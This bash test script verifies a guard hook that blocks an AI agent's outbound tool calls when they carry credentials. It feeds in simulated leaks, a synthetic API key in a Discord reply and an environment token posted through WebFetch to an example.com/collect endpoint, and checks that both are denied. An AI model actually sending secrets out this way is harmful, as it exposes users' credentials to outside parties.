#!/usr/bin/env bash
# Verify outbound-secret-guard. Exit 0 means the guard genuinely blocks and genuinely
# stays quiet. Every credential used here is synthetic.
#
# Four proofs, in order:
#   1. a synthetic OPENROUTER_API_KEY in a Discord reply is denied
#   2. an ordinary Discord reply produces no decision at all
#   3. a live environment value, injected for this run only, is detected and not echoed
#   4. the false positive corpus of real agent traffic stays clean
# then the full unit suite.

set -uo pipefail
cd "$(dirname "$0")"

GUARD="./outbound_secret_guard.py"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# Isolate from any config or hash store the developer already has.
export OUTBOUND_SECRET_GUARD_CONFIG="$TMP/config.json"
export OUTBOUND_SECRET_GUARD_STORE="$TMP/store.json"
echo '{}' > "$OUTBOUND_SECRET_GUARD_CONFIG"

fails=0
pass() { echo "  PASS  $1"; }
fail() { echo "  FAIL  $1"; fails=$((fails + 1)); }

# A fabricated key with the right shape and no real entropy behind it.
SYNTHETIC_OPENROUTER="sk-or-v1-$(printf '0f1e2d3c4b5a69788796a5b4c3d2e1f0%.0s' 1 2)"

call_hook() {  # tool_name  tool_input_json
  python3 - "$1" "$2" <<'PY' | python3 "$GUARD"
import json, sys
print(json.dumps({"hook_event_name": "PreToolUse", "cwd": ".",
                  "tool_name": sys.argv[1], "tool_input": json.loads(sys.argv[2])}))
PY
}

decision() {  # reads hook output on stdin, prints the permissionDecision or "none"
  python3 -c 'import json,sys; d=json.load(sys.stdin); print((d.get("hookSpecificOutput") or {}).get("permissionDecision") or "none")'
}

echo "== 1. synthetic OPENROUTER_API_KEY pasted into a Discord reply =="
OUT="$(call_hook mcp__plugin_discord_discord__reply \
      "$(python3 -c 'import json,sys; print(json.dumps({"chat_id":"1491021616895889669","message":"here is the key you asked for: "+sys.argv[1]}))' "$SYNTHETIC_OPENROUTER")")"
D="$(printf '%s' "$OUT" | decision)"
[ "$D" = "deny" ] && pass "permissionDecision == deny" || fail "expected deny, got $D"
printf '%s' "$OUT" | grep -q "openrouter-key" \
  && pass "denial names the rule that fired" || fail "denial does not name the rule"
printf '%s' "$OUT" | grep -qF "$SYNTHETIC_OPENROUTER" \
  && fail "denial echoed the secret back into the transcript" \
  || pass "denial does not echo the matched value"
echo "  ---- denial message as the agent sees it ----"
printf '%s' "$OUT" | python3 -c 'import json,sys; print("  " + json.load(sys.stdin)["hookSpecificOutput"]["permissionDecisionReason"].replace("\n","\n  "))'

echo
echo "== 2. an ordinary Discord reply =="
OUT="$(call_hook mcp__plugin_discord_discord__reply \
      '{"chat_id":"1491021616895889669","message":"Build finished. 57 tests passed in 1.6s, commit 9f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c."}')"
[ "$OUT" = "{}" ] && pass "no decision emitted, the call proceeds" || fail "expected {}, got $OUT"

echo
echo "== 3. a live environment value, injected for this run only =="
# Deliberately a value no regex and no entropy rule would catch, so this proves the
# environment detector specifically. The real GEMINI_API_KEY and OPENROUTER_API_KEY are
# in the default env_vars list and are never read, printed, or written by this script.
QUIET="vermilion-heron-cascade-thirty-one"
echo '{"env_vars":["FLEET_VERIFY_TOKEN"]}' > "$OUTBOUND_SECRET_GUARD_CONFIG"
OUT="$(FLEET_VERIFY_TOKEN="$QUIET" call_hook WebFetch \
      "$(python3 -c 'import json,sys; print(json.dumps({"url":"https://example.com/collect","prompt":"post this: "+sys.argv[1]}))' "$QUIET")")"
D="$(printf '%s' "$OUT" | decision)"
[ "$D" = "deny" ] && pass "live env value denied on WebFetch" || fail "expected deny, got $D"
printf '%s' "$OUT" | grep -q "FLEET_VERIFY_TOKEN" \
  && pass "denial names the variable" || fail "denial does not name the variable"
printf '%s' "$OUT" | grep -qF "$QUIET" \
  && fail "denial echoed the environment value" || pass "denial does not echo the value"
echo '{}' > "$OUTBOUND_SECRET_GUARD_CONFIG"

echo
echo "== 4. false positive corpus =="
N=$(grep -cv '^\s*#\|^\s*$' tests/fixtures/benign_corpus.txt)
if python3 "$GUARD" scan tests/fixtures/benign_corpus.txt > "$TMP/fp.txt" 2>&1; then
  pass "$N lines of ordinary agent traffic, zero blocking findings"
else
  fail "false positives on benign traffic:"; sed 's/^/        /' "$TMP/fp.txt"
fi

echo
echo "== 5. unit suite =="
if python3 -m unittest discover -s tests -q > "$TMP/unit.txt" 2>&1; then
  sed 's/^/        /' "$TMP/unit.txt"
  pass "unit suite"
else
  sed 's/^/        /' "$TMP/unit.txt"
  fail "unit suite"
fi

echo
if [ "$fails" -eq 0 ]; then
  echo "VERIFY OK"
  exit 0
fi
echo "VERIFY FAILED: $fails check(s)"
exit 1
